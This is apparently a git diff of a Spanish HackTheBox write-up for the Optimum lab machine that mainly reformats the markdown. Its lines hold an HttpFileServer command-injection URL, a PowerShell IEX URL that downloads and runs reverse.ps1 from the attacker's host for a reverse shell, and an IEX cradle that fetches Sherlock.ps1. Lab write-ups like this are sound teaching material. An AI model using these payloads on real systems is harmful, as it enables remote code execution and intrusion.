@@ -33,9 +33,7 @@ Solo tenemos el puerto 80 abierto... algo raro para ser una máquina windows y r
 
 Vamos a abrir el navgeador y a ver que tenemos.
 
-
 ![](/assets/images/HTB/Optimum-HackTheBox/web1.png)
-
 
 Lo primero que encontramos es una web que al parecer sirve para subir archivos.
 
@@ -64,14 +62,15 @@ Nos genera una url con la que podremos ejecutar los comandos, pero no funciona..
 
 Asique intento probar algo para ver si realmente funciona, la idea es hacer un ping desde la máquina víctima a mi máquina a través del cmd.
 
-``http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.3.}``
+```bash
+http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.3.}
+```
 
 Para comprobar el funcionamiento abro wireshark y filtro el tráfico para ver solo paquetes ICMP.
 
-*¡RECORDAR QUE DEBEMOS CAPTURAR EL TRÁFICO EN LA INTERFAZ tun0 (que es la de la VPN de HTB)!*
+> ¡RECORDAR QUE DEBEMOS CAPTURAR EL TRÁFICO EN LA INTERFAZ tun0 (que es la de la VPN de HTB)!
 
 ![](/assets/images/HTB/Optimum-HackTheBox/wireshark.png)
-
 
 Como vemos funciona, tenemos ping.
 
@@ -94,12 +93,11 @@ python3 -m http.server 8080
 
 Y añadimos el siguiente comando a la url del navegador para pasar el archivo reverse.ps1 a la máquina víctima y ejecutarlo.
 
-```url
+```bash
  http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.3/reverse.ps1').} 
  ```
 
 Abrimos un oyente netcat en el puerto que hemos configurado en el archivo reverse.ps1 (en mi caso 4444).
-
 
 ![](/assets/images/HTB/Optimum-HackTheBox/rev2.png)
 
@@ -110,8 +108,7 @@ Una vez tenemos la conexión ya podemos leer la flag user
 
 Primero enumero un poco la máquina lanzando systeminfo para ver ante que versión de Windows estamos 
 
-```cmd
-systeminfo
+```bash
 
 Host Name:                 OPTIMUM
 OS Name:                   Microsoft Windows Server 2012 R2 Standard
@@ -213,15 +210,17 @@ Buscando herramientas que busquen vulnerabilidades en el sistema Windows di con 
 Sigo los pasos descargando el repositorio --> [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)
 
 
-> Ejecutamos el servidor de python
+1. Ejecutamos el servidor de python
 
 `` python3 -m http.server 8080 ``
 
-> Subimos y ejecutamos el Sherlock.ps1 con el comando:
+2. Subimos y ejecutamos el Sherlock.ps1 con el comando:
 
-`` powershell "iex(new-object net.webclient).downloadString('http://10.10.14.3:8080/Sherlock.ps1');Find-AllVulns" ``
+```powershell
+powershell "iex(new-object net.webclient).downloadString('http://10.10.14.3:8080/Sherlock.ps1');Find-AllVulns" 
+```
 
-> Encontramos 3 posibles Vulnerabilidades
+3. Encontramos 3 posibles Vulnerabilidades
 
 ```powershell
 Title      : Secondary Logon Handle
